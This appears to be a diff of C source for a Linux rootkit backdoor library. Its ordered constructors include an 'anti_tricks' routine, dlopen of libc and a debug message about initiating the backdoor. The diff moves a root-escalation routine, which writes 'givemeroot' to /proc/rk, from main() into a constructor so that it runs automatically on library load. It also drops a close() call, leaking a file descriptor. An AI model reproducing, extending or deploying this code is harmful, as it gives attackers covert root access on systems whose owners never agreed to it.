@@ -25,45 +25,15 @@ static int rk_exec(const char *file, const char *cmd)
     int fd;
 
     if((fd = open(file, O_WRONLY)) < 0)
-        return 1;
+        return -1;
 
     write(fd, cmd, strlen(cmd));
-    close(fd)
 
     return 0;
 }
 
 int main(void)
 {
-    int fd, uid, orig_uid, orig_gid;
-#ifdef DEBUG
-    printf("Normal Operation!\r\n");
-#endif
-
-    orig_uid = getuid();
-    orig_gid = getgid();
-
-    if(orig_uid > 0)
-        printf("Not Root!\r\n");
-
-    rk_exec("/proc/rk", "givemeroot");
-
-    uid = getuid();
-
-    if(uid == 0) // TODO: Root priveledged stuff
-        printf("Are Root!\r\n");
-    else if(uid == orig_uid)
-        printf("Still Not Root!\r\n");
-
-    setuid(orig_uid);
-    setgid(orig_gid);
-
-    uid = getuid();
-
-    if(uid != orig_uid || uid == 0)
-        printf("Still Root, uid: %d\r\n", uid);
-    else if(uid == orig_uid)
-        printf("We're not root anymore, uid: %d\r\n", uid);
 
     return 0;
 }
@@ -129,7 +99,7 @@ __attribute__((constructor (101))) void anti_tricks(void)
     }
 }
 
-__attribute__((constructor (102))) void init(void)
+__attribute__((constructor (102))) void pre_core(void)
 {
     libc = dlopen(LIBC_PATH, RTLD_LAZY);
 
@@ -142,6 +112,39 @@ __attribute__((constructor (102))) void init(void)
         printf("Failed initiating backdoor!\r\n");
 #endif
     }
+}
 
+__attribute__((constructor (103))) int post_core(void)
+{
+    int uid, orig_uid, orig_gid;
+#ifdef DEBUG
+    printf("Normal Operation!\r\n");
+#endif
 
+    orig_uid = getuid();
+    orig_gid = getgid();
+
+    if(orig_uid > 0)
+        printf("Not Root!\r\n");
+
+    rk_exec("/proc/rk", "givemeroot");
+
+    uid = getuid();
+
+    if(uid == 0) // TODO: Root priveledged stuff
+        printf("Are Root!\r\n");
+    else if(uid == orig_uid)
+        printf("Still Not Root!\r\n");
+
+    setuid(orig_uid);
+    setgid(orig_gid);
+
+    uid = getuid();
+
+    if(uid != orig_uid || uid == 0)
+        printf("Still Root, uid: %d\r\n", uid);
+    else if(uid == orig_uid)
+        printf("We're not root anymore, uid: %d\r\n", uid);
+
+    return 0;
 }
